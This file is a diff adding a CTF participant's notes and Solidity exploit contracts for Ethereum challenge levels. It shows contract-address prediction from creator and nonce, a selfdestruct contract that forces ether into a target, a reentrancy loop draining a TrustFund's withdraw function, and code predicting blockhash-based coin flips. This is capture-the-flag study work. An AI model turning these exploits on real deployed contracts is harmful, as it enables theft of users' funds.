@@ -1,0 +1,255 @@
+ Research for LEVEL 10
+
+acct 0x1eed0499df1539767af3a4981c8c598572bac20a started challenge
+by sending 2.5 eth to 0xdcb37036c66bc6a5a19ccf0dbc0253e584499954
+	triggering beginGame()
+		creates developer addr 0xeD0D5160c642492b3B482e006F67679F5b6223A2 with 2.5 eth
+			creates rainy day fund contract 0x4ec96F180c88130460E4Fa96113BB4351C778595
+				creates debugAuthorizer contract 0xb934b149a405F18557100e73982f488c97b334a4
+
+acct 0x1eed0499df1539767af3a4981c8c598572bac20a then calls withdraw function
+on rainy day fund contract 0x4ec96F180c88130460E4Fa96113BB4351C778595 collecting 2.5 eth
+
+trick is to guess the new debugAuthorizer addr and send it 1.337 eth
+then get a new challenge which creates the new debugAuthorizer contract whose addrs we guessed
+
+0xeD0D5160c642492b3B482e006F67679F5b6223A2 + nonce (currently 10)
+
+0xeD0D5160c642492b3B482e006F67679F5b6223A2
++ last nonce (9) =
+0x67D65cCD87C55b1a12600e3217c965AD01D3A680
+
+0x67D65cCD87C55b1a12600e3217c965AD01D3A680
++ nonce 1 = 0xa0f93d103c3292332F15Eb51E67fACb6b044Cec6
+balance = 1.337
+============================
+MY TURN
+0xeD0D5160c642492b3B482e006F67679F5b6223A2
++ nonce 10 = 0xa130935D79D1B574A5293A03A63489C828619FfC
+
+0xa130935D79D1B574A5293A03A63489C828619FfC
++ nonce 1 = 0x4A6ca9e0f947CEfe90d0784fDa1800D285c8A76d
+
+// "0xca35b7d915458ef540ade6068dfe2f44e8fa733c", "0x14723a09acff6d2a60dcdf7aa4aff308fddc160c"
+pragma solidity 0.4.24;
+
+import "./challenges.sol";
+
+contract level10 {
+    //"guess" the address for the next contract deployment of _baseAddr
+    function newAddressForAddrAndNonce(address _baseAddr, uint8 nonce) public view returns (address newAddress) {
+        require(nonce < 127);
+        return address(sha3(0xd6, 0x94, _baseAddr, nonce));
+    }
+
+    function attack(address _victim) public payable returns(bool) {
+        //require msg.value == 1.337 ether
+        _victim.transfer(1.337 ether);
+        return true;
+    }
+
+    function () external payable {
+
+    }
+    function getBalance() external view returns(uint256) {
+        return address(this).balance;
+    }
+
+
+}
+
+// pragma solidity 0.4.24;
+// // "0xca35b7d915458ef540ade6068dfe2f44e8fa733c", "0x14723a09acff6d2a60dcdf7aa4aff308fddc160c"
+// //ropsten 0x4e5995b7abff78b47906f4c20d31acaafd1659fe
+// import "./CTF.sol";
+
+// contract Kamikaze {
+
+//     constructor(address _victim) public payable {
+//         //require msg.value == 3.5 eth
+//         selfdestruct(_victim);
+//     }
+// }
+
+// contract tests {
+//     function () external payable {
+
+//     }
+//     function attack(address _victim) public payable returns(bool) {
+//         (new Kamikaze).value(3.5 ether)(_victim); //creates a new Kamikaze contract with 3.5 eth and push the money to the victim on selfdestruct
+//         SlotMachine victim = SlotMachine(_victim);
+//         if (address(victim).call.value(1 szabo)()) {
+//             msg.sender.transfer(address(this).balance);
+//             return true;
+//         }
+//     }
+//     function getBalance() external view returns(uint256 my) {
+//         return address(this).balance;
+//     }
+// }
+
+// pragma solidity 0.4.24;
+// // "0xca35b7d915458ef540ade6068dfe2f44e8fa733c", "0x14723a09acff6d2a60dcdf7aa4aff308fddc160c"
+
+// import "./CTF.sol";
+
+// contract tests { //ropsten 0x98ef85c1b2cc1c14fe9a48647b2fa885ada63c1f
+
+//     uint i;
+
+//     function () external payable {
+//         if (i < 10) {
+//             this.attack(msg.sender);
+//         }
+//     }
+
+//     function attack(address _victim) external returns(bool) {
+//         TrustFund victim = TrustFund(_victim);
+
+//         victim.withdraw();
+//         i++;
+//     }
+
+//     function getBalance() external view returns(uint256) {
+//         return address(this).balance;
+//     }
+
+//     function withdraw() external {
+//         msg.sender.transfer(address(this).balance);
+//     }
+// }
+
+
+// pragma solidity 0.4.24;
+
+// // import "./SafeMath.sol";
+// // 10 szabo == 10000000000000 wei == 0.00001
+
+// import "./CTF.sol";
+
+// contract tests {
+
+//     function () external payable {
+
+//     }
+
+//     function attack(address _victim) external payable returns(bool) {
+//         bytes32 entropy = blockhash(block.number-1);
+//         bytes1 coinFlip = entropy[0] & 1;
+//         bool guess = (coinFlip == 0 ? false : true);
+//         HeadsOrTails victim = HeadsOrTails(_victim);
+
+//         uint i;
+//         while (i < 20) {
+//             victim.play.value(100000000000000000 wei)(guess);
+//             i++;
+//         }
+//     }
+
+//     function getBalance() external view returns(uint256) {
+//         return address(this).balance;
+//     }
+
+//     function withdraw() external {
+//         msg.sender.transfer(address(this).balance);
+//     }
+// }
+
+
+    // bytes32 public hash1;
+    // bytes32 public hashDEBUG; //should be == hash2
+    // bytes32 public unhashedTarget; //this is the number to use as guess!
+    // bytes32 public target;
+    // bytes32 public lastGuess;
+
+    // function getHash() public {
+    //     hash1 = blockhash(block.number); //0x00
+    //     hashDEBUG = keccak256(abi.encodePacked(0x971BF49495F4038144ba52024f7cF92D0ffc56AB));
+    //     target = keccak256(abi.encodePacked(hash1 ^ hashDEBUG));
+    //     unhashedTarget = hash1 ^ hashDEBUG; //this is the _myGuess value
+    // }
+
+    // function guess(uint256 _myGuess) public returns(bool) {
+    //     lastGuess = keccak256(abi.encodePacked(_myGuess));
+    //     return (lastGuess == target);
+    // }
+
+// pragma solidity 0.4.24;
+
+// // import "./SafeMath.sol"; //0xfee53118c376552cb41fc03e1ca551c73ceddced (ropsten deployment)
+// //4626217 -> 0x765de64c0bc2ad8b4d92ec01db2e0150852db41108eacb49b0f48d3e47b94e60
+
+// contract tests {
+
+//     bytes32 public blockHash;
+//     bytes32 public addrHash;
+//     bytes32 public targetHash;
+//     bytes32 public seedHash;
+//     uint256 public seed;
+
+
+//     function getBlockHash() public returns(bytes32) {
+//         blockHash = blockhash(block.number);
+//     }
+//     function getAddrHash() public returns(bytes32) {
+//         addrHash = keccak256(abi.encodePacked(msg.sender));
+//     }
+//     function genTargetHash() public {
+//         targetHash = blockHash ^ addrHash;
+//     }
+//     function unscramble() public {
+//         seedHash = targetHash ^ addrHash;
+//     }
+//     function toUint() public view returns(uint256) {
+//         return uint256(address(msg.sender));
+//     }
+//     function verify(uint256 _seed) public view returns(bool, bytes32) {
+//         bytes32 guess = keccak256(abi.encodePacked(_seed));
+//         return (guess == targetHash, guess);
+//     }
+
+//     // uint256 public totalPot = 100;
+//     // mapping(address=>uint256) public balances;
+
+//     // bytes32 public entropy;
+//     // bytes32 public entropy2;
+//     // bytes32 public target;
+//     // bytes32 public guess;
+
+//     // function play(uint256 _seed) external returns(bool) {
+//     //     entropy = blockhash(block.number);
+//     //     entropy2 = keccak256(abi.encodePacked(msg.sender));
+//     //     target = keccak256(abi.encodePacked(entropy^entropy2));
+//     //     guess = keccak256(abi.encodePacked(_seed));
+
+//     //     if(guess==target){
+//     //         //winner
+//     //         uint256 payout = totalPot;
+//     //         totalPot = 0;
+//     //         balances[msg.sender] = payout;
+//     //         return true;
+//     //     }
+//     // }
+
+//     // function getBlockNum() public view returns(uint256) { //4625859
+//     //     return block.number;
+//     // }
+//     // function getEntropy(uint _blockNumber) public view returns(bytes32) { //0x4227936e1193cc3f15f7379e652ad8ab99a92ec603cb6a09a7c89e9246b3b369
+//     //     return blockhash(_blockNumber);
+//     // }
+//     // function getEntropy2() public view returns(bytes32) { //0x4ed71ba22c872af0485037d2f52e52df9a3b09cccdc72be5c0104f8ed9b3f02d
+//     //     return keccak256(abi.encodePacked(msg.sender));
+//     // }
+//     // function getXor(bytes32 _entropy, bytes32 _entropy2) public pure returns(bytes32 res) { //0x0cf088cc3d14e6cf5da7004c90048a740392270ace0c41ec67d8d11c9f004344
+//     //     res = keccak256(abi.encodePacked(_entropy ^ _entropy2)); //xor hash(msg.sender) hash(block.number)
+//     // }
+//     // function getGuess(uint256 _seed) public pure returns(bytes32 guess_) { //(4625859 =) 0xc426da20560d14536417d9c8cfbc61441de9ab5912084bb9eed45367e8f35c13
+//     //     guess_ = keccak256(abi.encodePacked(_seed)); //what uint has a hash equal to entropy xor entropy2 ?
+//     // }
+//     // function findGuess(bytes32 _entropy, bytes32 _entropy2) public pure returns(bytes32 res) {
+//     //     res = keccak256(abi.encodePacked(_entropy ^ _entropy2));
+//     // }
+
+// }
+
+// // 10 szabo == 10000000000000 wei == 0.00001
